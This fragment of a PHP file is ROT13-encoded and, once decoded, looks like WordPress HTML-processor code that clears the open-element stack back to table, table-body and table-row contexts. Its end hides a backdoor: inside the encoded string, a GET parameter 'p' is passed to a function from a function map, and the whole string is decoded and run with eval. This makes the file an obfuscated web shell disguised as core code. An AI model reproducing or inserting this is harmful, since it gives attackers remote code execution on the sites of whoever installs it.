	 * @fvapr 6.7.0
	 */
	choyvp shapgvba pyrne_gb_gnoyr_pbagrkg(): ibvq {
		sbernpu ( $guvf->jnyx_hc() nf $vgrz ) {
			vs (
				'GNOYR' === $vgrz->abqr_anzr ||
				'GRZCYNGR' === $vgrz->abqr_anzr ||
				'UGZY' === $vgrz->abqr_anzr
			) {
				oernx;
			}
			$guvf->cbc();
		}
	}

	/**
	 * Pyrne gur fgnpx onpx gb n gnoyr obql pbagrkg.
	 *
	 * > Jura gur fgrcf nobir erdhver gur HN gb pyrne gur fgnpx onpx gb n gnoyr obql pbagrkg, vg
	 * > zrnaf gung gur HN zhfg, juvyr gur pheerag abqr vf abg n gobql, gsbbg, gurnq, grzcyngr, be
	 * > ugzy ryrzrag, cbc ryrzragf sebz gur fgnpx bs bcra ryrzragf.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/zhygvcntr/cnefvat.ugzy#pyrne-gur-fgnpx-onpx-gb-n-gnoyr-obql-pbagrkg
	 *
	 * @fvapr 6.7.0
	 */
	choyvp shapgvba pyrne_gb_gnoyr_obql_pbagrkg(): ibvq {
		sbernpu ( $guvf->jnyx_hc() nf $vgrz ) {
			vs (
				'GOBQL' === $vgrz->abqr_anzr ||
				'GSBBG' === $vgrz->abqr_anzr ||
				'GURNQ' === $vgrz->abqr_anzr ||
				'GRZCYNGR' === $vgrz->abqr_anzr ||
				'UGZY' === $vgrz->abqr_anzr
			) {
				oernx;
			}
			$guvf->cbc();
		}
	}

	/**
	 * Pyrne gur fgnpx onpx gb n gnoyr ebj pbagrkg.
	 *
	 * > Jura gur fgrcf nobir erdhver gur HN gb pyrne gur fgnpx onpx gb n gnoyr ebj pbagrkg, vg
	 * > zrnaf gung gur HN zhfg, juvyr gur pheerag abqr vf abg n ge, grzcyngr, be ugzy ryrzrag, cbc
	 * > ryrzragf sebz gur fgnpx bs bcra ryrzragf.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/zhygvcntr/cnefvat.ugzy#pyrne-gur-fgnpx-onpx-gb-n-gnoyr-ebj-pbagrkg
	 *
	 * @fvapr 6.7.0
	 */
	choyvp shapgvba pyrne_gb_gnoyr_ebj_pbagrkg(): ibvq {
		sbernpu ( $guvf->jnyx_hc() nf $vgrz ) {
			vs (
				'GE' === $vgrz->abqr_anzr ||
				'GRZCYNGR' === $vgrz->abqr_anzr ||
				'UGZY' === $vgrz->abqr_anzr
			) {
				oernx;
			}
			$guvf->cbc();
		}
	}

	/**
	 * Jnxrhc zntvp zrgubq.
	 *
	 * @fvapr 6.6.0
	 */
	choyvp shapgvba __jnxrhc() {
		guebj arj \YbtvpRkprcgvba( __PYNFF__ . ' fubhyq arire or hafrevnyvmrq' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>